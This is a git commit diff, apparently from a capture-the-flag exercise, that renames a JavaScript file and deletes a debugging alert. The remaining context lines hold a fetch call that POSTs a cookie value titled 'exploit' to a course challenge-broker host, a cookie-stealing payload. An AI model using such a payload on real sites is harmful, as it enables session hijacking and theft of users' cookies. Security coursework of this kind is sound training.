90dc0601fda54f6137d532fc42ad3f34152830b7
Arti <123784674+wandaversion@users.noreply.github.com>
2024-04-09 21:16:08 -0400

    Update and rename cslmnopa.js to cslmnopb.js

--- cslmnopb.js
+++ cslmnopb.js
@@ -3,4 +3,3 @@ fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
     method: 'POST',  
     body: JSON.stringify({ title: 'exploit', content: cookie_flag })
 })
-alert("testing"+cookie_flag);
